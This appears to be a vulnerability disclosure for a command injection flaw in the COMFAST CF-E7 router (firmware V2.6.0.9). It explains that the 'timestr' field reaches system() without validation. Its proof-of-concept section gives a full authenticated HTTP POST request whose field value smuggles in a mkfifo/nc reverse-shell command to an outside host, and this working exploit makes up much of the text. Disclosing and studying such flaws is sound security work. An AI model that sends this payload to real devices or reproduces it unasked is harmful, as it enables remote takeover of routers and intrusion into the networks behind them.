## Comfast CF-E7 Router

- **Supplier:** COMFAST

- **Product:** COMFAST CF-E7

- **Firmware Version:** V2.6.0.9

- **Vulnerability:** Command Injection

### Overview

A command injection vulnerability has been discovered in the COMFAST CF-E7 V2.6.0.9 Router. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/mbox-config?method=SET&section=ntp_timezone`, prompting the user to log in and obtain cookies.

### Vulnerability Details

The trigger point is located in the `sub_41ACCC` method of the `webmggnt` component. Here, the `timestr` field is not validated and is concatenated using `sprintf`, and then executed using `system`, which requires that `ntp` not be enabled.

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-07-14-59-49-image.png)

### poc

```http
POST /cgi-bin/mbox-config?method=SET&section=ntp_timezone HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: appliation/json
X-Requested-With: XMLHttpRequest
Content-Length: 219
Origin: http://192.168.0.1
Sec-GPC: 1
Connection: close
Referer: http://192.168.0.1/computer/ntp.html
Cookie: COMFAST_SESSIONID=c0a80002-4261ffffffc85cffffff8a5f-327b23c6
Priority: u=0

{"timestr":"2021-10-10 10:10:10\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #","timezone":"UTC-8","zonename":"63","ntp_client_enabled":"0","ntp_servername":"0.openwrt.pool.ntp.org"}
```

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-07-15-00-33-18e34387-87c6-45b5-b092-800fe7c79032.png)
